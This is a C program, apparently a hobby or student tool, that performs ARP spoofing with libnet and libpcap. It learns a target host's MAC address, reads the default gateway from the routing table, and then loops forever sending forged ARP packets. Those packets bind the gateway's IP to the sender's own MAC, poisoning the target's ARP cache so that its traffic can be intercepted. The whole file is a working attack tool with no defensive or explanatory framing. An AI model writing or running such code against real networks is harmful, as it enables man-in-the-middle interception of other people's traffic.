#include <stdio.h>
#include <stdlib.h>
#include <libnet.h>
#include <stdint.h>
#include <string.h>
#include <pcap.h>
#include <pthread.h>
#include <time.h>


#define MAC_LEN	6
#define IP_LEN	4
#define ARP_REQUEST 1    
#define ARP_REPLY 2   
#define MAXBYTES2CAPTURE 2048 
typedef struct arphdr { 
  u_int16_t htype;    
  u_int16_t ptype;   
  u_char hlen;        
  u_char plen;       
  u_int16_t oper;     
  u_char sha[MAC_LEN];     
  u_char spa[IP_LEN];    
  u_char tha[MAC_LEN];    
  u_char tpa[IP_LEN];      
}arphdr_t; 


 arphdr_t *arpheader = NULL; 


 // ARP Request

int ARP_REQ(char argv[]){

	libnet_t *l;
  char errbuf[LIBNET_ERRBUF_SIZE], target_ip_addr_str[16];
  u_int32_t target_ip_addr, src_ip_addr;
  u_int8_t mac_broadcast_addr[6] = {0xff, 0xff, 0xff, 0xff,0xff, 0xff},
  mac_zero_addr[6] = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0};
  struct libnet_ether_addr *src_mac_addr;
  int bytes_written;


  l = libnet_init(LIBNET_LINK, NULL, errbuf);
  if ( l == NULL ) {
    fprintf(stderr, "libnet_init() failed: %s\n", errbuf);
    exit(EXIT_FAILURE);
  }



  src_ip_addr = libnet_get_ipaddr4(l);
  if ( src_ip_addr == -1 ) {
    fprintf(stderr, "Couldn't get own IP address: %s\n",\
    libnet_geterror(l));
    libnet_destroy(l);
    exit(EXIT_FAILURE);
  }

  src_mac_addr = libnet_get_hwaddr(l);
  if ( src_mac_addr == NULL ) {
    fprintf(stderr, "Couldn't get own IP address: %s\n",\
    libnet_geterror(l));
    libnet_destroy(l);
    exit(EXIT_FAILURE);
  }




  target_ip_addr = libnet_name2addr4(l, argv,\
  LIBNET_DONT_RESOLVE);

  if ( target_ip_addr == -1 ) {
    fprintf(stderr, "Error converting IP address.\n");
    libnet_destroy(l);
    exit(EXIT_FAILURE);
  }



  if ( libnet_autobuild_arp (ARPOP_REQUEST,\
      src_mac_addr->ether_addr_octet,\
      (u_int8_t*)(&src_ip_addr), mac_zero_addr,\
      (u_int8_t*)(&target_ip_addr), l) == -1)
  {
    fprintf(stderr, "Error building ARP header: %s\n",\
    libnet_geterror(l));
    libnet_destroy(l);
    exit(EXIT_FAILURE);
  }



  if ( libnet_autobuild_ethernet (mac_broadcast_addr,\
                          ETHERTYPE_ARP, l) == -1 )
  {
    fprintf(stderr, "Error building Ethernet header: %s\n",\
    libnet_geterror(l));
    libnet_destroy(l);
    exit(EXIT_FAILURE);  }




  bytes_written = libnet_write(l);
  if ( bytes_written != -1 )
  printf("%d bytes written.\n", bytes_written);
  else
  fprintf(stderr, "Error writing packet: %s\n",\
  libnet_geterror(l));
  libnet_destroy(l);
  return 0;
}


// PCAP NEXT (Packet capture)

int PCAP_NEXT(){

char *dev;
int i=0; 
bpf_u_int32 netaddr=0, mask=0;    
struct bpf_program filter;       
char errbuf[PCAP_ERRBUF_SIZE];    
pcap_t *descr = NULL;             
struct pcap_pkthdr pkthdr;        
const unsigned char *packet=NULL; 
                   
memset(errbuf,0, PCAP_ERRBUF_SIZE); 

dev = pcap_lookupdev(errbuf);


 if ((descr = pcap_open_live(dev, MAXBYTES2CAPTURE, 0,  512, errbuf))==NULL){
  fprintf(stderr, "ERROR: %s\n", errbuf);
  exit(1);
 }
    

 if( pcap_lookupnet( dev , &netaddr, &mask, errbuf) == -1){
  fprintf(stderr, "ERROR: %s\n", errbuf);
  exit(1);
 }


 if ( pcap_compile(descr, &filter, "arp", 1, mask) == -1){
  fprintf(stderr, "ERROR: %s\n", pcap_geterr(descr) );
  exit(1);
 }


 if (pcap_setfilter(descr,&filter) == -1){
  fprintf(stderr, "ERROR: %s\n", pcap_geterr(descr) );
  exit(1);
 }


 while(1){ 
 
 if ( (packet = pcap_next(descr,&pkthdr)) == NULL){  
  fprintf(stderr, "ERROR: Error getting the packet.\n");
  exit(1);
 	}

  arpheader = (struct arphdr *)(packet+14);

	 


 if (ntohs(arpheader->oper) == ARP_REPLY){ 
  printf("Sender MAC: "); 

  for(i=0; i<6;i++)
    printf("%02X:", arpheader->sha[i]); 

  printf("\nSender IP: "); 

  for(i=0; i<4;i++)
    printf("%d.", arpheader->spa[i]); 
    printf("\nTarget MAC: "); 

  for(i=0; i<6;i++)
    printf("%02X:", arpheader->tha[i]); 
    printf("\nTarget IP: "); 

  for(i=0; i<4; i++)
    printf("%d.", arpheader->tpa[i]); 
    printf("\n"); 

    break;

  } 

 } 

return 0;

}


// ARP Reply

int ARP_REP(){
	int i=0;
	libnet_t *l; 
  char errbuf[LIBNET_ERRBUF_SIZE], target_ip_addr_str[16];
  u_int32_t target_ip_addr, src_ip_addr;
  u_int8_t mac_zero_addr[6] = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0};
  struct libnet_ether_addr *src_mac_addr;
  int bytes_written;
  char  buff[BUFSIZ];
  char senderIp[BUFSIZ];
  u_int8_t senderMac[MAC_LEN];

  FILE *fp;

	printf("\nARP Spoofing...\n\n");

	fp = popen( "ip route | awk '/default/ {print $3}'", "r");
   if ( NULL == fp)
   	{
      perror( "popen() failed");
     	return -1;
   	}

 if((fgets( buff, BUFSIZ, fp)) == NULL ){
		fprintf(stderr, "get gateway failed\n");
		exit(EXIT_FAILURE);
   }

    buff[strlen(buff)-1]='\0';
    printf("get gateway: %s\n", buff);
    pclose( fp);

  l = libnet_init(LIBNET_LINK, NULL, errbuf);
 if ( l == NULL ) {
    fprintf(stderr, "libnet_init() failed: %s\n", errbuf);
    exit(EXIT_FAILURE);
  }



  src_ip_addr = libnet_name2addr4(l, buff, LIBNET_DONT_RESOLVE);
 if ( src_ip_addr == -1 ) {
    fprintf(stderr, "Couldn't get own IP address: %s\n",\
    libnet_geterror(l));
    libnet_destroy(l);
    exit(EXIT_FAILURE);
  }

    printf("set own ip address: %s\n", libnet_addr2name4(src_ip_addr, LIBNET_DONT_RESOLVE));

  src_mac_addr = libnet_get_hwaddr(l);
 if ( src_mac_addr == NULL ) {
    fprintf(stderr, "Couldn't get own IP address: %s\n",\
    libnet_geterror(l));
    libnet_destroy(l);
    exit(EXIT_FAILURE);
  }

 
	sprintf(senderIp, "%d.%d.%d.%d", arpheader->spa[0], arpheader->spa[1], arpheader->spa[2], arpheader->spa[3]);

target_ip_addr = libnet_name2addr4(l, senderIp, LIBNET_DONT_RESOLVE);
 if ( target_ip_addr == -1 ) {
    fprintf(stderr, "Error converting IP address: %s\n", libnet_geterror(l));
    libnet_destroy(l);
    exit(EXIT_FAILURE);
  }

  printf("set sender ip address: %s\n", libnet_addr2name4(target_ip_addr, LIBNET_DONT_RESOLVE));


 if ( libnet_autobuild_arp (ARPOP_REQUEST,\
      src_mac_addr->ether_addr_octet,\
      (u_int8_t*)(&src_ip_addr), mac_zero_addr,\
      (u_int8_t*)(&target_ip_addr), l) == -1)
  {
    fprintf(stderr, "Error building ARP header: %s\n",\
    libnet_geterror(l));
    libnet_destroy(l);
    exit(EXIT_FAILURE);
  }

 for(i=0; i<MAC_LEN; i++)
	  senderMac[i] = (unsigned int)arpheader->sha[i];

  printf("set sender mac address: %02X:%02X:%02X:%02X:%02X:%02X\n", \
		  senderMac[0],\
		  senderMac[1],\
		  senderMac[2],\
		  senderMac[3],\
		  senderMac[4],\
		  senderMac[5]);

 if ( libnet_autobuild_ethernet (senderMac,\
                          ETHERTYPE_ARP, l) == -1 )
  {
    fprintf(stderr, "Error building Ethernet header: %s\n",\
    libnet_geterror(l));
    libnet_destroy(l);
    exit(EXIT_FAILURE);
  }



  bytes_written = libnet_write(l);
 if ( bytes_written != -1 )
    printf("%d bytes written.\n", bytes_written);
 else
    fprintf(stderr, "Error writing packet: %s\n",\
    libnet_geterror(l));
    libnet_destroy(l);
  return 0;

}



int main(int argc, char *argv[]) {
  
	printf("%s", argv[1]);
  ARP_REQ(argv[1]);
  PCAP_NEXT();
	
  while(1){
    ARP_REP();
    sleep(1);
  }

}
